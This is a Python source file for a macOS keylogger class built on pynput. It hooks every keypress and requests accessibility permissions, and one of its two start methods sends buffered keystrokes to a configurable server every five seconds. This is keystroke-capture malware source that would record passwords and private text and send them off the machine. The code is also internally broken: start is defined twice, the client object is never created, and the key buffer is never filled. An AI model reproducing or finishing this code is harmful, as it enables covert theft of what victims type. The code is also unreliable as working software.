from pynput.keyboard import Listener
from typing import List
from .interfaces import IKeyLogger
from datetime import datetime
import threading
import logging
from ..utils.permissions import PermissionChecker, MacPermissionError
import time

class MacKeyLogger(IKeyLogger):
    def __init__(self, server_host='localhost', server_port=5002):
        self.key_buffer: List[str] = []
        self.buffer_lock = threading.Lock()
        self.running = False
        self.listener = None
        self.current_minute = ""
        self.log_path = "keylog.txt"
        self.callback = None
        self.logged_keys = []
        
        # Setup logging
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
        
        # Initial permission check
        try:
            self._check_permissions()
        except MacPermissionError as e:
            self.logger.error(f"Permission error during initialization: {e}")
            raise
        except Exception as e:
            self.logger.error(f"Unexpected error during initialization: {e}")
            raise


    def _check_permissions(self) -> None:
        """Verify all required permissions before starting"""
        has_permission, message = PermissionChecker.check_macos_permissions()
        
        if not has_permission:
            self.logger.warning(f"System permissions not granted: {message}")
            PermissionChecker.request_macos_permissions()
            raise MacPermissionError("Required system permissions not granted")
            
        if not PermissionChecker.check_file_permissions(self.log_path):
            raise MacPermissionError(f"No write permission for log file: {self.log_path}")
        
        self.logger.info("All permissions verified successfully")

    def start_logging(self) -> None:
        """Start the keyboard listener with error handling"""
        if self.running:
            self.logger.warning("Keylogger is already running")
            return

        try:
            self._check_permissions()
            
            self.running = True
            self.listener = Listener(
                on_press=self._on_press,
                suppress=False  # Changed this to False
            )
            self.listener.daemon = True  # Make it a daemon thread
            self.listener.start()
            self.logger.info("Keylogger started successfully")
            
        except Exception as e:
            self.running = False
            self.logger.error(f"Error starting keylogger: {e}")
            raise

    def stop_logging(self) -> None:
        """Stop the keyboard listener safely"""
        if not self.running:
            self.logger.warning("Keylogger is not running")
            return

        try:
            self.running = False
            if self.listener:
                self.listener.stop()
                self.listener = None
            self.logger.info("Keylogger stopped successfully")
            
        except Exception as e:
            self.logger.error(f"Error stopping keylogger: {e}")
            raise

    def get_logged_keys(self) -> List[str]:
        """Safely retrieve and clear the key buffer"""
        try:
            with self.buffer_lock:
                keys = self.key_buffer.copy()
                self.key_buffer.clear()
                return keys
        except Exception as e:
            self.logger.error(f"Error retrieving logged keys: {e}")
            return []

    def _on_press(self, key):
        try:
            # Convert the key to a string representation
            key_str = str(key)
            if hasattr(key, 'char'):
                key_str = key.char
            elif hasattr(key, 'name'):
                key_str = key.name
                
            # Send the key string to the callback
            if self.callback:
                self.callback(key_str)
                
        except Exception as e:
            self.logger.error(f"Error processing key: {e}")

    def __del__(self):
        """Ensure clean shutdown"""
        try:
            if self.running:
                self.stop_logging()
        except Exception as e:
            self.logger.error(f"Error during cleanup: {e}")

    def start(self, callback=None):
        """Start the keylogger with optional callback"""
        try:
            self.callback = callback
            self.running = True
            self.listener = Listener(on_press=self._on_press)
            self.listener.start()
            self.logger.info("Keylogger started successfully")
        except Exception as e:
            self.logger.error(f"Error starting keylogger: {e}")
            self.running = False
            raise

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None

    def start(self, callback=None):
        """
        Start the keylogger with optional callback
        """
        try:
            self.callback = callback
            self.running = True
            self.listener = Listener(on_press=self._on_press)
            self.listener.start()
            
            if self.client.connect():
                # Main logging loop
                while self.running:
                    logs = self.get_logged_keys()
                    if logs:
                        self.client.send_logs(''.join(logs))
                    time.sleep(5)
        except Exception as e:
            self.logger.error(f"Error starting keylogger: {e}")
            self.running = False
            raise